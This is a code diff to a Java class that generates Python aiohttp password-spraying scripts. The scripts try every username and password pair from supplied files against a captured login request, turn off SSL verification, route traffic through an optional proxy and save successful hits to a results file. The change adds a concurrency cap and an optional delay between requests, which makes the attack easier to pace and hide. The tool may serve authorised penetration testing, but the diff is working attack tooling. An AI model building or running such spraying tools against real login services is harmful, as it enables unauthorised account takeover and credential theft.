@@ -97,9 +97,10 @@ public class ReqParser {
         sb.append(buildMainFunction());
         sb.append("\n\n");
         sb.append("if __name__ == '__main__':\n");
-        sb.append(Utility.indent(1) + "loop = asyncio.get_event_loop()\n");
+        sb.append(Utility.indent(1) + "loop = asyncio.new_event_loop()\n");
+        sb.append(Utility.indent(1) + "asyncio.set_event_loop(loop)\n");
         sb.append(Utility.indent(1) + "loop.run_until_complete(main())\n");
-        sb.append(Utility.indent(1) + "conn.close()\n");
+        sb.append(Utility.indent(1) + "loop.close()\n");
         return sb.toString();
     }
 
@@ -175,7 +176,7 @@ public class ReqParser {
         // Make the request
         if (session) {
             sb.append(Utility.indent(baseIndent + 1) + "async with client.request(\n");
-            sb.append(Utility.indent(baseIndent + 2) + " ssl=ssl,\n");
+            sb.append(Utility.indent(baseIndent + 2) + "ssl=ssl,\n");
         } else {
             sb.append(Utility.indent(baseIndent + 1)
                     + "async with aiohttp.TCPConnector(ssl=ssl) as conn:\n");
@@ -320,17 +321,11 @@ public class ReqParser {
         StringBuilder sb = new StringBuilder();
         sb.append("JAR_UNSAFE = True\n");
         sb.append("CLIENT_TOTAL_TIMEOUT = 60\n");
-        sb.append("CONN_POOL_SIZE = 10\n");
-        sb.append("CONN_TTL_DNS_CACHE = 300\n");
         sb.append("SSL_VERIFY = False\n");
         sb.append("LOG_LEVEL = logging.INFO\n\n");
         sb.append(
                 "logging.basicConfig(level=LOG_LEVEL, format=\"%(asctime)s - %(levelname)s - %(message)s\")\n");
         sb.append("timeout = aiohttp.ClientTimeout(total=CLIENT_TOTAL_TIMEOUT)\n");
-        sb.append("conn = aiohttp.TCPConnector(\n");
-        sb.append(Utility.indent(1)
-                + "limit_per_host=CONN_POOL_SIZE, ttl_dns_cache=CONN_TTL_DNS_CACHE\n");
-        sb.append(")\n");
         return sb.toString();
     }
 
@@ -342,30 +337,34 @@ public class ReqParser {
      */
     private String buildSprayFunction(int messageCount) {
         StringBuilder sb = new StringBuilder();
-        sb.append("async def spray(username, password, proxy=None):\n");
-        sb.append(Utility.indent(1) + "jar = aiohttp.CookieJar(unsafe=JAR_UNSAFE)\n");
-        sb.append(Utility.indent(1) + "try:\n");
-        sb.append(Utility.indent(2) + "async with aiohttp.ClientSession(\n");
-        sb.append(Utility.indent(3)
-                + "timeout=timeout, cookie_jar=jar, connector=conn, connector_owner=False\n");
-        sb.append(Utility.indent(2) + ") as client:\n");
+        sb.append("async def spray(\n");
+        sb.append(Utility.indent(1) + "username, password, semaphore, sleep=0, proxy=None\n");
+        sb.append("):\n");
+        sb.append(Utility.indent(1) + "async with semaphore:\n");
+        sb.append(Utility.indent(2) + "await asyncio.sleep(sleep)\n");
+        sb.append(Utility.indent(2) + "jar = aiohttp.CookieJar(unsafe=JAR_UNSAFE)\n");
+        sb.append(Utility.indent(2) + "try:\n");
+        sb.append(Utility.indent(3) + "async with aiohttp.ClientSession(\n");
+        sb.append(Utility.indent(4)
+                + "timeout=timeout, cookie_jar=jar\n");
+        sb.append(Utility.indent(3) + ") as client:\n");
         for (int i = 0; i < messageCount; i++) {
-            sb.append(Utility.indent(3) + "(status, headers, cookies, length, body) = await req" + i
+            sb.append(Utility.indent(4) + "(status, headers, cookies, length, body) = await req" + i
                     + "_fetch(client, ssl=SSL_VERIFY, proxy=proxy)\n");
-            sb.append(Utility.indent(3) + "# TODO: add your logic here\n");
+            sb.append(Utility.indent(4) + "# TODO: add your logic here\n");
         }
+        sb.append(Utility.indent(4) + "result = {\n");
+        sb.append(Utility.indent(5) + "'username': username,\n");
+        sb.append(Utility.indent(5) + "'password': password,\n");
+        sb.append(Utility.indent(5) + "'status': status,\n");
+        sb.append(Utility.indent(5) + "'content-length': length,\n");
+        sb.append(Utility.indent(4) + "}\n");
+        sb.append(Utility.indent(2) + "except Exception as e:\n");
         sb.append(Utility.indent(3) + "result = {\n");
         sb.append(Utility.indent(4) + "'username': username,\n");
         sb.append(Utility.indent(4) + "'password': password,\n");
-        sb.append(Utility.indent(4) + "'status': status,\n");
-        sb.append(Utility.indent(4) + "'content-length': length,\n");
+        sb.append(Utility.indent(4) + "'error': str(e),\n");
         sb.append(Utility.indent(3) + "}\n");
-        sb.append(Utility.indent(1) + "except Exception as e:\n");
-        sb.append(Utility.indent(2) + "result = {\n");
-        sb.append(Utility.indent(3) + "'username': username,\n");
-        sb.append(Utility.indent(3) + "'password': password,\n");
-        sb.append(Utility.indent(3) + "'error': str(e),\n");
-        sb.append(Utility.indent(2) + "}\n");
         sb.append(Utility.indent(1) + "return result\n");
         return sb.toString();
     }
@@ -380,8 +379,9 @@ public class ReqParser {
         sb.append("async def main():\n");
         sb.append(Utility.indent(1)
                 + "parser = argparse.ArgumentParser(description='Password spraying script')\n");
-        sb.append(Utility.indent(1)
-                + "parser.add_argument('-x', '--proxy', help='Proxy URL', default=None)\n");
+        sb.append(Utility.indent(1) + "parser.add_argument(\n");
+        sb.append(Utility.indent(2)
+                + "'-x', '--proxy', help='Proxy URL (<scheme>://<host>:<port>)', default=None)\n");
         sb.append(Utility.indent(1) + "parser.add_argument(\n");
         sb.append(Utility.indent(2)
                 + "'-e', '--errors', help='File to save errors', default='errors.txt'\n");
@@ -389,6 +389,18 @@ public class ReqParser {
         sb.append(Utility.indent(1) + "parser.add_argument(\n");
         sb.append(Utility.indent(2)
                 + "'-o', '--output', help='File to save successful requests', default='results.csv'\n");
+        sb.append(Utility.indent(1) + ")\n");
+        sb.append(Utility.indent(1) + "parser.add_argument(\n");
+        sb.append(Utility.indent(2)
+                + "'-t', '--threads', help='Number of concurrent threads (default: %(default)s)',\n");
+        sb.append(Utility.indent(2)
+                + "type=int, default=10\n");
+        sb.append(Utility.indent(1) + ")\n");
+        sb.append(Utility.indent(1) + "parser.add_argument(\n");
+        sb.append(Utility.indent(2)
+                + "'-s', '--sleep', help='Sleep time in seconds between requests (default: %(default)s)',\n");
+        sb.append(Utility.indent(2)
+                + "type=int, default=0\n");
         sb.append(Utility.indent(1) + ")\n");
         sb.append(Utility.indent(1)
                 + "parser.add_argument('usernames', help='File containing usernames')\n");
@@ -406,9 +418,10 @@ public class ReqParser {
         sb.append(Utility.indent(2) + "async for line in f:\n");
         sb.append(Utility.indent(3) + "passwords.append(line.strip())\n\n");
         sb.append(Utility.indent(1) + "tasks = []\n");
+        sb.append(Utility.indent(1) + "semaphore = asyncio.Semaphore(args.threads)\n\n");
         sb.append(Utility.indent(1) + "for password in passwords:\n");
         sb.append(Utility.indent(2) + "for username in usernames:\n");
-        sb.append(Utility.indent(3) + "tasks.append(spray(username, password, args.proxy))\n");
+        sb.append(Utility.indent(3) + "tasks.append(spray(username, password, semaphore, args.sleep, args.proxy))\n");
         sb.append(Utility.indent(1) + "logging.info('Spraying %d combinations', len(tasks))\n\n");
         sb.append(Utility.indent(1) + "results = await asyncio.gather(*tasks)\n");
         sb.append(Utility.indent(1) + "for result in results:\n");
@@ -429,7 +442,7 @@ public class ReqParser {
         sb.append(Utility.indent(2) + "async with aiofiles.open(args.errors, 'w') as f:\n");
         sb.append(Utility.indent(3) + "for error in errors:\n");
         sb.append(Utility.indent(4)
-                + "await f.write(f\"{error['username']}:{error['password']} - {error['error']}\")\n");
+                + "await f.write(f\"{error['username']}:{error['password']} - {error['error']}\\n\")\n");
         sb.append(Utility.indent(2)
                 + "logging.info('Saved %d errors to %s', len(errors), args.errors)\n\n");
         sb.append(Utility.indent(1) + "logging.info('Completed tasks: %d', len(requested))\n");
